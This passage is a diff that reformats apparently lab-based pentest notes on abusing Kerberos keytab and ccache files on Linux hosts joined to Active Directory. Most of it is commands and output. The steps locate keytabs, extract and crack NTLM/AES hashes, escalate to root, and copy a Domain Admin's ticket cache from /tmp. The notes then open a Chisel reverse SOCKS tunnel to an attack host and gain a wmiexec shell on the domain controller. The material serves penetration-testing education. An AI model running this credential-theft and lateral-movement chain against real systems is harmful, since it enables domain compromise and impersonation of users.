 ```
+131610      4 -rw-------   1 root     root         1348 Oct  4 16:26 /etc/krb5.keytab
+262169      4 -rw-rw-rw-   1 root     root          216 Oct 12 15:13 /opt/specialfiles/carlos.keytab
+```
+
+</td>
+</tr>
+</table>
 
 </details>
 
 <details>
 <summary><h5>Identifying KeyTab files in Cronjobs</h5></summary>
 
-**Step 1: Identify KeyTab files in Cronjobs:**
+1. **Identify** KeyTab files in Cronjobs.
+
+<table width="100%">
+<tr>
+<td colspan="2"> 🎯 <b>bash — Linux - Target</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`user@linux:~$`**
+
+</td>
+<td>
 
 ```bash
 crontab -l
 ```
-```bash
-# m h  dom mon dow   command
-# *5/ * * * * /home/carlos@<corp.rth>/.scripts/kerberos_script_test.sh
+
+</td>
+</tr>
+<tr>
+<td colspan="2">
+
+---
+
+```
+m h  dom mon dow   command
+*5/ * * * * /home/carlos@<corp.rth>/.scripts/kerberos_script_test.sh
 ```
 
-**Step 2: Inspect script for KeyTab usage:**
+</td>
+</tr>
+</table>
+
+2. **Inspect** script for KeyTab usage.
+
+<table width="100%">
+<tr>
+<td colspan="2"> 🎯 <b>bash — Linux - Target</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`user@linux:~$`**
+
+</td>
+<td>
 
 ```bash
 cat /home/carlos@<corp.rth>/.scripts/kerberos_script_test.sh
 ```
+
+</td>
+</tr>
+<tr>
+<td colspan="2">
+
+---
+
 ```bash
 #!/bin/bash
 
-# kinit svc_workstations@<CORP.RTH> -k -t /home/carlos@<corp.rth>/.scripts/svc_workstations.kt
-# smbclient //dc01.<corp.rth>/svc_workstations -c 'ls'  -k -no-pass > /home/carlos@<corp.rth>/script-test-results.txt
+kinit svc_workstations@<CORP.RTH> -k -t /home/carlos@<corp.rth>/.scripts/svc_workstations.kt
+smbclient //dc01.<corp.rth>/svc_workstations -c 'ls'  -k -no-pass > /home/carlos@<corp.rth>/script-test-results.txt
 ```
+
+</td>
+</tr>
+</table>
 
 </details>
 
@@ -7876,14 +8761,38 @@ cat /home/carlos@<corp.rth>/.scripts/kerberos_script_test.sh
 <details>
 <summary><h5>Reviewing environment variables for ccache files</h5></summary>
 
-**Identify the location of our Kerberos credentials cache:**
+**Identify** the location of our Kerberos credentials cache.
+
+<table width="100%">
+<tr>
+<td colspan="2"> 🎯 <b>bash — Linux - Target</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`user@linux:~$`**
+
+</td>
+<td>
 
 ```bash
 env | grep -i krb5
 ```
-```bash
-# KRB5CCNAME=FILE:/tmp/krb5cc_647402606_qd2Pfh
+
+</td>
+</tr>
+<tr>
+<td colspan="2">
+
+---
+
 ```
+KRB5CCNAME=FILE:/tmp/krb5cc_647402606_qd2Pfh
+```
+
+</td>
+</tr>
+</table>
 
 </details>
 
@@ -7892,19 +8801,43 @@ env | grep -i krb5
 
 Ccache files are located, by default, at `/tmp`.
 
-**1. Read information from a keytab file:**
+**List** ccache files in /tmp.
+
+<table width="100%">
+<tr>
+<td colspan="2"> 🎯 <b>bash — Linux - Target</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`user@linux:~$`**
+
+</td>
+<td>
 
 ```bash
 ls -la /tmp
 ```
-```bash
-# total 68
-# drwxrwxrwt 13 root                     root                           4096 Oct  6 16:38 .
-# drwxr-xr-x 20 root                     root                           4096 Oct  6  2021 ..
-# -rw-------  1 julio@<corp.rth>  domain users@<corp.rth> 1406 Oct  6 16:38 krb5cc_647401106_tBswau
-# -rw-------  1 david@<corp.rth>  domain users@<corp.rth> 1406 Oct  6 15:23 krb5cc_647401107_Gf415d
-# -rw-------  1 carlos@<corp.rth> domain users@<corp.rth> 1433 Oct  6 15:43 krb5cc_647402606_qd2Pfh
+
+</td>
+</tr>
+<tr>
+<td colspan="2">
+
+---
+
 ```
+total 68
+drwxrwxrwt 13 root                     root                           4096 Oct  6 16:38 .
+drwxr-xr-x 20 root                     root                           4096 Oct  6  2021 ..
+-rw-------  1 julio@<corp.rth>  domain users@<corp.rth> 1406 Oct  6 16:38 krb5cc_647401106_tBswau
+-rw-------  1 david@<corp.rth>  domain users@<corp.rth> 1406 Oct  6 15:23 krb5cc_647401107_Gf415d
+-rw-------  1 carlos@<corp.rth> domain users@<corp.rth> 1433 Oct  6 15:43 krb5cc_647402606_qd2Pfh
+```
+
+</td>
+</tr>
+</table>
 
 We can now impersonate the user with kinit.
 
@@ -7921,12 +8854,26 @@ We can now impersonate the user with kinit.
 
 Before importing a new ticket via keytab, make a backup of the current credential cache file to avoid losing your existing Kerberos TGT.
 
-**Create the backup**
+<table width="100%">
+<tr>
+<td colspan="2"> 🎯 <b>bash — Linux - Target</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`user@linux:~$`**
+
+</td>
+<td>
 
 ```bash
 echo $KRB5CCNAME
 cp "$KRB5CCNAME" /tmp/backup_ccache
 ```
+
+</td>
+</tr>
+</table>
 
 This lets you restore the original ticket later, preserving session continuity and credentials.
 
@@ -7943,59 +8890,143 @@ A keytab file lists one or more Kerberos principals along with their encrypted s
 <details>
 <summary><h6>Option 1: Accessing Domain Shares via Impersonation</h6></summary>
 
-**Step 1: Verify the current Kerberos ticket**
+1. **Verify** the current Kerberos ticket.
+
+<table width="100%">
+<tr>
+<td colspan="2"> 🎯 <b>bash — Linux - Target</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`user@linux:~$`**
+
+</td>
+<td>
 
 ```bash
 klist
 ```
-```bash
-# Ticket cache: FILE:/tmp/krb5cc_647401107_r5qiuu
-# Default principal: david@<corp.rth>
 
-# Valid starting     Expires            Service principal
-# 10/06/25 17:02:11  10/07/25 03:02:11  krbtgt/<CORP.RTH>@<CORP.RTH>
-#         renew until 10/07/25 17:02:11
-```
-
-> **Note:** At this point, the active user is david.
+</td>
+</tr>
+<tr>
+<td colspan="2">
 
 ---
 
-**Step 2: Authenticate using the specified keytab, without entering a password.**
+```
+Ticket cache: FILE:/tmp/krb5cc_647401107_r5qiuu
+Default principal: david@<corp.rth>
+
+Valid starting     Expires            Service principal
+10/06/25 17:02:11  10/07/25 03:02:11  krbtgt/<CORP.RTH>@<CORP.RTH>
+        renew until 10/07/25 17:02:11
+```
+
+</td>
+</tr>
+</table>
+
+> **Note:** At this point, the active user is david.
+
+2. **Authenticate** using the specified keytab, without entering a password.
+
+<table width="100%">
+<tr>
+<td colspan="2"> 🎯 <b>bash — Linux - Target</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`user@linux:~$`**
+
+</td>
+<td>
 
 ```bash
 kinit carlos@<CORP.RTH> -k -t /opt/specialfiles/carlos.keytab
 ```
 
-**Step 3: Confirm the change:**
+</td>
+</tr>
+</table>
+
+3. **Confirm** the change.
+
+<table width="100%">
+<tr>
+<td colspan="2"> 🎯 <b>bash — Linux - Target</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`user@linux:~$`**
+
+</td>
+<td>
 
 ```bash
 klist
 ```
-```bash
-# Ticket cache: FILE:/tmp/krb5cc_647401107_r5qiuu
-# Default principal: carlos@<CORP.RTH>
 
-# Valid starting     Expires            Service principal
-# 10/06/22 17:16:11  10/07/22 03:16:11  krbtgt/<CORP.RTH>@<CORP.RTH>
-```
-
-> **Note:** The active principal is now carlos, indicating the ticket switched successfully.
+</td>
+</tr>
+<tr>
+<td colspan="2">
 
 ---
 
-**Step 4: Connecting to SMB Share as Carlos:**
+```
+Ticket cache: FILE:/tmp/krb5cc_647401107_r5qiuu
+Default principal: carlos@<CORP.RTH>
+
+Valid starting     Expires            Service principal
+10/06/22 17:16:11  10/07/22 03:16:11  krbtgt/<CORP.RTH>@<CORP.RTH>
+```
+
+</td>
+</tr>
+</table>
+
+> **Note:** The active principal is now carlos, indicating the ticket switched successfully.
+
+4. **Connect** to SMB Share as Carlos.
+
+<table width="100%">
+<tr>
+<td colspan="2"> 🎯 <b>bash — Linux - Target</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`user@linux:~$`**
+
+</td>
+<td>
 
 ```bash
 smbclient //dc01/carlos -k -c ls
 ```
-```bash
-#   .                                   D        0  Thu Oct  6 14:46:26 2022
-#   ..                                  D        0  Thu Oct  6 14:46:26 2022
-#   carlos.txt                          A       15  Thu Oct  6 14:46:54 2022
 
-#                 7706623 blocks of size 4096. 4452852 blocks available
+</td>
+</tr>
+<tr>
+<td colspan="2">
+
+---
+
 ```
+  .                                   D        0  Thu Oct  6 14:46:26 2022
+  ..                                  D        0  Thu Oct  6 14:46:26 2022
+  carlos.txt                          A       15  Thu Oct  6 14:46:54 2022
+
+                7706623 blocks of size 4096. 4452852 blocks available
+```
+
+</td>
+</tr>
+</table>
 
 </details>
 
@@ -8004,33 +9035,55 @@ smbclient //dc01/carlos -k -c ls
 
 We can use KeyTabExtract—a Python script—to extract data from version 0x502 .keytab files used for Kerberos authentication on Linux systems. This script can be found in its [GitHub repository](https://github.com/sosdave/KeyTabExtract) or [`here`](../scripts/passwords/keytabextract.py).
 
-* Realm
-* Service Principal
-* Encryption Types
-* Hashes (e.g. NTLM, AES-256, AES-128)
+- Realm
+- Service Principal
+- Encryption Types
+- Hashes (e.g. NTLM, AES-256, AES-128)
 
 ---
 
-**Step 1: Use KeyTabExtract to extract the info**
+1. **Use** KeyTabExtract to extract the info.
+
+<table width="100%">
+<tr>
+<td colspan="2"> 🎯 <b>bash — Linux - Target</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`user@linux:~$`**
+
+</td>
+<td>
 
 ```bash
-python3 ./keytabextract.py /opt/specialfiles/carlos.keytab 
+python3 ./keytabextract.py /opt/specialfiles/carlos.keytab
 ```
-```bash
-# [*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.
-# [*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.
-# [*] AES128-CTS-HMAC-SHA1 hash discovered. Will attempt hash extraction.
-# [+] Keytab File successfully imported.
-#         REALM : <CORP.RTH>
-#         SERVICE PRINCIPAL : carlos/
-#         NTLM HASH : a738f92b3c08b424ec2d99589a9cce60
-#         AES-256 HASH : 42ff0baa586963d9010584eb9590595e8cd47c489e25e82aae69b1de2943007f
-#         AES-128 HASH : fa74d5abf4061baa1d4ff8485d1261c4
-```
+
+</td>
+</tr>
+<tr>
+<td colspan="2">
 
 ---
 
-**Step 2: Crack the password**
+```
+[*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.
+[*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.
+[*] AES128-CTS-HMAC-SHA1 hash discovered. Will attempt hash extraction.
+[+] Keytab File successfully imported.
+        REALM : <CORP.RTH>
+        SERVICE PRINCIPAL : carlos/
+        NTLM HASH : a738f92b3c08b424ec2d99589a9cce60
+        AES-256 HASH : 42ff0baa586963d9010584eb9590595e8cd47c489e25e82aae69b1de2943007f
+        AES-128 HASH : fa74d5abf4061baa1d4ff8485d1261c4
+```
+
+</td>
+</tr>
+</table>
+
+2. **Crack** the password.
 
 With the NTLM hash, we can perform a Pass the Hash attack. With the AES256 or AES128 hash, we can forge our tickets using Rubeus or attempt to crack the hashes to obtain the plaintext password.
 
@@ -8038,15 +9091,29 @@ With the NTLM hash, we can perform a Pass the Hash attack. With the AES256 or AE
 
 The most straightforward hash to crack is the NTLM hash. We can use tools like Hashcat or John the Ripper to crack it. However, a quick way to decrypt passwords is with online repositories such as [crackstation](https://crackstation.net/), which contains billions of passwords.
 
----
+3. **Log in** as the desired user.
 
-**Step 3: Log in as the desired user**
+<table width="100%">
+<tr>
+<td colspan="2"> 🎯 <b>bash — Linux - Target</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`user@linux:~$`**
+
+</td>
+<td>
 
 ```bash
 su - carlos@<corp.rth>
 ```
 
-**Step 4: Obtain more hashes**
+</td>
+</tr>
+</table>
+
+4. **Obtain** more hashes.
 
 The user has a cronjob that uses a KeyTab file named, for example, `svc_workstations.kt`. We can repeat the process, crack the password, and log in as svc_workstations.
 
@@ -8061,113 +9128,266 @@ To abuse a `.ccache` file, we only need read access. These files are typically s
 
 After logging in with the `svc_workstations` credentials, we can run `sudo -l` to verify that the user is allowed to execute any command as root. From there, we can escalate privileges by running `sudo su` to switch to the root user.
 
-**Step 1: Connect to Target**
+1. **Connect** to target.
+
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`kali@kali:~$`**
+
+</td>
+<td>
 
 ```bash
 ssh svc_workstations@<corp.rth>@<IP> -p <PORT_TO_FORWARD>
 ```
 
-**Step 2: Check Sudo Permissions**
+</td>
+</tr>
+</table>
+
+2. **Check** sudo permissions.
+
+<table width="100%">
+<tr>
+<td colspan="2"> 🎯 <b>bash — Linux - Target</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`user@linux:~$`**
+
+</td>
+<td>
 
 ```bash
 sudo -l
 ```
 
-**Step 3: Elevate to Root**
+</td>
+</tr>
+</table>
+
+3. **Elevate** to root.
+
+<table width="100%">
+<tr>
+<td colspan="2"> 🎯 <b>bash — Linux - Target</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`user@linux:~$`**
+
+</td>
+<td>
 
 ```bash
 sudo su
-```
-
-**Step 4: Verify Access**
-
-```bash
 whoami
 ```
 
+</td>
+</tr>
+</table>
+
 As root, we need to identify which tickets are present on the machine, to whom they belong, and their expiration time.
 
-**Step 5: Search `/tmp` Directory**
+4. **Search** `/tmp` directory.
+
+<table width="100%">
+<tr>
+<td colspan="2"> 🎯 <b>bash — Linux - Target (root)</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`root@linux:~#`**
+
+</td>
+<td>
 
 ```bash
 ls -la /tmp
 ```
-```bash
-# total 76
-# drwxrwxrwt 13 root                               root                           4096 Oct  7 11:35 .
-# drwxr-xr-x 20 root                               root                           4096 Oct  6  2021 ..
-# -rw-------  1 julio@<>            domain users@<> 1406 Oct  7 11:35 krb5cc_647401106_HRJDux
-# -rw-------  1 julio@<>            domain users@<> 1406 Oct  7 11:35 krb5cc_647401106_qMKxc6
-# -rw-------  1 david@<>            domain users@<> 1406 Oct  7 10:43 krb5cc_647401107_O0oUWh
-# -rw-------  1 svc_workstations@<> domain users@<> 1535 Oct  7 11:21 krb5cc_647401109_D7gVZF
-# -rw-------  1 carlos@<>           domain users@<> 3175 Oct  7 11:35 krb5cc_647402606
-# -rw-------  1 carlos@<>           domain users@<> 1433 Oct  7 11:01 krb5cc_647402606_ZX6KFA
-```
 
-If there is an user to whom we have not yet gained access. We can confirm the groups to which he belongs using id.
+</td>
+</tr>
+<tr>
+<td colspan="2">
 
 ---
 
-**Step 6: Check Group Membership**
+```
+total 76
+drwxrwxrwt 13 root                               root                           4096 Oct  7 11:35 .
+drwxr-xr-x 20 root                               root                           4096 Oct  6  2021 ..
+-rw-------  1 julio@<>            domain users@<> 1406 Oct  7 11:35 krb5cc_647401106_HRJDux
+-rw-------  1 julio@<>            domain users@<> 1406 Oct  7 11:35 krb5cc_647401106_qMKxc6
+-rw-------  1 david@<>            domain users@<> 1406 Oct  7 10:43 krb5cc_647401107_O0oUWh
+-rw-------  1 svc_workstations@<> domain users@<> 1535 Oct  7 11:21 krb5cc_647401109_D7gVZF
+-rw-------  1 carlos@<>           domain users@<> 3175 Oct  7 11:35 krb5cc_647402606
+-rw-------  1 carlos@<>           domain users@<> 1433 Oct  7 11:01 krb5cc_647402606_ZX6KFA
+```
+
+</td>
+</tr>
+</table>
+
+If there is a user to whom we have not yet gained access, we can confirm the groups to which they belong using id.
+
+5. **Check** group membership.
+
+<table width="100%">
+<tr>
+<td colspan="2"> 🎯 <b>bash — Linux - Target (root)</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`root@linux:~#`**
+
+</td>
+<td>
 
 ```bash
 id julio@<corp.rth>
 ```
-```bash
-# uid=647401106(julio@<corp.rth>) gid=647400513(domain users@<corp.rth>) groups=647400513(domain users@<corp.rth>),647400512(domain admins@<corp.rth>),647400572(denied rodc password replication group@<corp.rth>)
+
+</td>
+</tr>
+<tr>
+<td colspan="2">
+
+---
+
 ```
+uid=647401106(julio@<corp.rth>) gid=647400513(domain users@<corp.rth>) groups=647400513(domain users@<corp.rth>),647400512(domain admins@<corp.rth>),647400572(denied rodc password replication group@<corp.rth>)
+```
+
+</td>
+</tr>
+</table>
 
 Julio is a member of the **Domain Admins** group. We can attempt to impersonate the user and gain access to the **DC01** Domain Controller host.
 
 To import the ccache file into our current session, we can copy the ccache file and assign the file path to the KRB5CCNAME variable.
 
-**Step 7: Prepare Environment**
+6. **Prepare** environment.
+
+<table width="100%">
+<tr>
+<td colspan="2"> 🎯 <b>bash — Linux - Target (root)</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`root@linux:~#`**
+
+</td>
+<td>
 
 ```bash
 cp /tmp/krb5cc_647401106_HRJDux .
 export KRB5CCNAME=$(pwd)/krb5cc_647401106_HRJDux
 ```
 
-**Step 8: Verify Ticket**
+</td>
+</tr>
+</table>
+
+7. **Verify** ticket.
+
+<table width="100%">
+<tr>
+<td colspan="2"> 🎯 <b>bash — Linux - Target (root)</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`root@linux:~#`**
+
+</td>
+<td>
 
 ```bash
 klist
 ```
-```bash
-# Ticket cache: FILE:/root/krb5cc_647401106_I8I133
-# Default principal: julio@<CORP.RTH>
 
-# Valid starting       Expires              Service principal
-# 10/07/2025 13:25:01  10/07/2025 23:25:01  krbtgt/<CORP.RTH>@<CORP.RTH>
-#         renew until 10/08/2025 13:25:01
+</td>
+</tr>
+<tr>
+<td colspan="2">
+
+---
+
+```
+Ticket cache: FILE:/root/krb5cc_647401106_I8I133
+Default principal: julio@<CORP.RTH>
+
+Valid starting       Expires              Service principal
+10/07/2025 13:25:01  10/07/2025 23:25:01  krbtgt/<CORP.RTH>@<CORP.RTH>
+        renew until 10/08/2025 13:25:01
 ```
 
-> **Note:** Check "Valid starting" and "Expires" times
+</td>
+</tr>
+</table>
 
-**Step 9: Access Domain Resources**
+> **Note:** Check "Valid starting" and "Expires" times.
+
+8. **Access** domain resources.
+
+<table width="100%">
+<tr>
+<td colspan="2"> 🎯 <b>bash — Linux - Target (root)</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`root@linux:~#`**
+
+</td>
+<td>
 
 ```bash
 smbclient //dc01/C$ -k -c ls -no-pass
 ```
-```bash
-#   $Recycle.Bin                      DHS        0  Wed Oct  6 17:31:14 2024
-#   Config.Msi                        DHS        0  Wed Oct  6 14:26:27 2024
-#   Documents and Settings          DHSrn        0  Wed Oct  6 20:38:04 2024
-#   john                                D        0  Mon Jul 18 13:19:50 2025
-#   julio                               D        0  Mon Jul 18 13:54:02 2025
-#   pagefile.sys                      AHS 738197504  Thu Oct  6 21:32:44 2025
-#   PerfLogs                            D        0  Fri Feb 25 16:20:48 2025
-#   Program Files                      DR        0  Wed Oct  6 20:50:50 2024
-#   Program Files (x86)                 D        0  Mon Jul 18 16:00:35 2025
-#   ProgramData                       DHn        0  Fri Aug 19 12:18:42 2025
-#   SharedFolder                        D        0  Thu Oct  6 14:46:20 2025
-#   System Volume Information         DHS        0  Wed Jul 13 19:01:52 2025
-#   tools                               D        0  Thu Sep 22 18:19:04 2025
-#   Users                              DR        0  Thu Oct  6 11:46:05 2025
-#   Windows                             D        0  Wed Oct  5 13:20:00 2025
 
-#                 7706623 blocks of size 4096. 4447612 blocks available
+</td>
+</tr>
+<tr>
+<td colspan="2">
+
+---
+
 ```
+  $Recycle.Bin                      DHS        0  Wed Oct  6 17:31:14 2024
+  Config.Msi                        DHS        0  Wed Oct  6 14:26:27 2024
+  Documents and Settings          DHSrn        0  Wed Oct  6 20:38:04 2024
+  john                                D        0  Mon Jul 18 13:19:50 2025
+  julio                               D        0  Mon Jul 18 13:54:02 2025
+  pagefile.sys                      AHS 738197504  Thu Oct  6 21:32:44 2025
+  PerfLogs                            D        0  Fri Feb 25 16:20:48 2025
+  Program Files                      DR        0  Wed Oct  6 20:50:50 2024
+  Program Files (x86)                 D        0  Mon Jul 18 16:00:35 2025
+  ProgramData                       DHn        0  Fri Aug 19 12:18:42 2025
+  SharedFolder                        D        0  Thu Oct  6 14:46:20 2025
+  System Volume Information         DHS        0  Wed Jul 13 19:01:52 2025
+  tools                               D        0  Thu Sep 22 18:19:04 2025
+  Users                              DR        0  Thu Oct  6 11:46:05 2025
+  Windows                             D        0  Wed Oct  5 13:20:00 2025
+
+                7706623 blocks of size 4096. 4447612 blocks available
+```
+
+</td>
+</tr>
+</table>
 
 > **NOTE:** `klist` displays the ticket information. We must consider the values "valid starting" and "expires." If the expiration date has passed, the ticket will not work. ccache files are temporary. They may change or expire if the user no longer uses them or during login and logout operations.
 
@@ -8186,84 +9406,191 @@ In our case, the attack host cannot directly connect to the **KDC** or resolve d
 
 ---
 
-**Modify `/etc/hosts`:**
+**Modify `/etc/hosts`.**
+
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`kali@kali:~$`**
+
+</td>
+<td>
 
 ```bash
 echo "<DC01_IP> <corp.rth> dc01.<corp.rth> dc01" | sudo tee -a /etc/hosts
 echo "<MS01_IP> ms01.<corp.rth> ms01" | sudo tee -a /etc/hosts
 ```
 
-**Confirm Changes:**
+</td>
+</tr>
+<tr>
+<td colspan="2">
 
-```bash
-cat /etc/hosts
+---
+
 ```
-```bash
 # Host addresses
-
-# <IP> <corp.rth> dc01.<corp.rth> dc01
-# <IP> ms01.<corp.rth> ms01
+<IP> <corp.rth> dc01.<corp.rth> dc01
+<IP> ms01.<corp.rth> ms01
 ```
 
-**Modify `/etc/proxychains.conf`:**
+</td>
+</tr>
+</table>
+
+**Modify `/etc/proxychains.conf`.**
+
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`kali@kali:~$`**
+
+</td>
+<td>
 
 ```bash
 sudo sed -i '/^\[ProxyList\]/,$c\[ProxyList]\nsocks5 127.0.0.1 1080' /etc/proxychains.conf
 ```
 
-**Confirm Changes:**
-
-```bash
-cat /etc/proxychains.conf
-```
-```bash
-# [ProxyList]
-# socks5 127.0.0.1 1080
-```
+</td>
+</tr>
+<tr>
+<td colspan="2">
 
 ---
 
-**Download Chisel to our attack host**
+```
+[ProxyList]
+socks5 127.0.0.1 1080
+```
+
+</td>
+</tr>
+</table>
+
+**Download** Chisel to our attack host and start the server.
+
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`kali@kali:~$`**
+
+</td>
+<td>
 
 ```bash
 wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz
 gzip -d chisel_1.7.7_linux_amd64.gz
 mv chisel_* chisel && chmod +x ./chisel
-sudo ./chisel server --reverse 
+sudo ./chisel server --reverse
 ```
-```bash
-# 2025/10/10 07:26:15 server: Reverse tunneling enabled
-# 2025/10/10 07:26:15 server: Fingerprint 58EulHjQXAOsBRpxk232323sdLHd0r3r2nrdVYoYeVM=
-# 2025/10/10 07:26:15 server: Listening on http://0.0.0.0:8080
-```
+
+</td>
+</tr>
+<tr>
+<td colspan="2">
 
 ---
 
-**Connect to MS01 with xfreerdp**
+```
+2025/10/10 07:26:15 server: Reverse tunneling enabled
+2025/10/10 07:26:15 server: Fingerprint 58EulHjQXAOsBRpxk232323sdLHd0r3r2nrdVYoYeVM=
+2025/10/10 07:26:15 server: Listening on http://0.0.0.0:8080
+```
+
+</td>
+</tr>
+</table>
+
+**Connect** to MS01 with xfreerdp.
+
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`kali@kali:~$`**
+
+</td>
+<td>
 
 ```bash
 xfreerdp /v:<IP> /u:<USER> /d:<corp.rth> /p:<PASSWORD> /dynamic-resolution
 ```
 
----
+</td>
+</tr>
+</table>
 
-**Execute chisel from MS01**
+**Execute** chisel from MS01.
+
+<table width="100%">
+<tr>
+<td colspan="2"> 📟 <b>cmd — Windows - Target</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`C:\>`**
+
+</td>
+<td>
 
 ```cmd
 c:\tools\chisel.exe client 10.10.14.33:8080 R:socks
 ```
-```cmd
+
+</td>
+</tr>
+<tr>
+<td colspan="2">
+
+---
+
+```
 2025/10/10 06:34:19 client: Connecting to ws://10.10.14.33:8080
 2025/10/10 06:34:20 client: Connected (Latency 125.6177ms)
 ```
 
----
+</td>
+</tr>
+</table>
 
-**Setting the KRB5CCNAME environment variable**
+**Set** the KRB5CCNAME environment variable.
+
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`kali@kali:~$`**
+
+</td>
+<td>
 
 ```bash
 export KRB5CCNAME=/home/<USER>/krb5cc_647401106_I8I133
 ```
+
+</td>
+</tr>
+</table>
 
 > **Note:** If you are not familiar with file transfer operations, check out the module [FILE TRANSFERS](./04-file-transfers.md).
 
@@ -8274,36 +9601,82 @@ export KRB5CCNAME=/home/<USER>/krb5cc_647401106_I8I133
 
 To use the Kerberos ticket, we need to specify our target machine name (not the IP address) and use the option -k. If we get a prompt for a password, we can also include the option -no-pass.
 
-**Use Impacket with proxychains and Kerberos authentication**
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`kali@kali:~$`**
+
+</td>
+<td>
 
 ```bash
 proxychains impacket-wmiexec dc01 -k
 ```
-```bash
-# [proxychains] config file found: /etc/proxychains.conf
-# [proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
-# [proxychains] DLL init: proxychains-ng 4.14
-# Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
 
-# [proxychains] Strict chain  ...  127.0.0.1:1080  ...  dc01:445  ...  OK
-# [proxychains] Strict chain  ...  127.0.0.1:1080  ...  <CORP.RTH>:88  ...  OK
-# [*] SMBv3.0 dialect used
-# [proxychains] Strict chain  ...  127.0.0.1:1080  ...  dc01:135  ...  OK
-# [proxychains] Strict chain  ...  127.0.0.1:1080  ...  <CORP.RTH>:88  ...  OK
-# [proxychains] Strict chain  ...  127.0.0.1:1080  ...  dc01:50713  ...  OK
-# [proxychains] Strict chain  ...  127.0.0.1:1080  ...  <CORP.RTH>:88  ...  OK
-# [!] Launching semi-interactive shell - Careful what you execute
-# [!] Press help for extra shell commands
+</td>
+</tr>
+<tr>
+<td colspan="2">
+
+---
+
+```
+[proxychains] config file found: /etc/proxychains.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.14
+Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  dc01:445  ...  OK
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  <CORP.RTH>:88  ...  OK
+[*] SMBv3.0 dialect used
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  dc01:135  ...  OK
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  <CORP.RTH>:88  ...  OK
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  dc01:50713  ...  OK
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  <CORP.RTH>:88  ...  OK
+[!] Launching semi-interactive shell - Careful what you execute
+[!] Press help for extra shell commands
 ```
 
-**Confirm current user**
+</td>
+</tr>
+</table>
+
+**Confirm** current user.
+
+<table width="100%">
+<tr>
+<td colspan="2"> 📟 <b>cmd — Windows - Target</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`C:\>`**
+
+</td>
+<td>
 
 ```cmd
 whoami
 ```
-```cmd
+
+</td>
+</tr>
+<tr>
+<td colspan="2">
+
+---
+
+```
 <corp.rth>\julio
 ```
+
+</td>
+</tr>
+</table>
 
 > **Note:** If you are using Impacket tools from a Linux machine connected to the domain, note that some Linux Active Directory implementations use the FILE: prefix in the KRB5CCNAME variable. If this is the case, we need to modify the variable only to include the path to the ccache file.
 
@@ -8314,63 +9687,128 @@ whoami
 
 To use [evil-winrm](https://github.com/Hackplayers/evil-winrm) with Kerberos, we need to install the Kerberos package used for network authentication. For some Linux like Debian-based (Parrot, Kali, etc.), it is called `krb5-user`. While installing, we'll get a prompt for the Kerberos realm. Use the domain name, and the KDC is the DC01.
 
-**Install Kerberos authentication package**
+1. **Install** Kerberos authentication package.
+
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`kali@kali:~$`**
+
+</td>
+<td>
 
 ```bash
 sudo apt-get install krb5-user -y
 ```
 
-In case the package krb5-user is already installed, we need to change the configuration file /etc/krb5.conf to include the following values:
+</td>
+</tr>
+</table>
 
-**Kerberos configuration file:**
+In case the package krb5-user is already installed, we need to change the configuration file `/etc/krb5.conf` to include the following values:
 
+<table width="100%">
+<tr>
+<td colspan="2"> 📄 <b>/etc/krb5.conf</b> </td>
+</tr>
+<tr>
+<td colspan="2">
 
-```bash
-# [libdefaults]
-#         default_realm = <CORP.RTH>
+```
+[libdefaults]
+        default_realm = <CORP.RTH>
 
-# ...
+...
 
-# [realms]
-#     <CORP.RTH> = {
-#         kdc = dc01.<corp.rth>
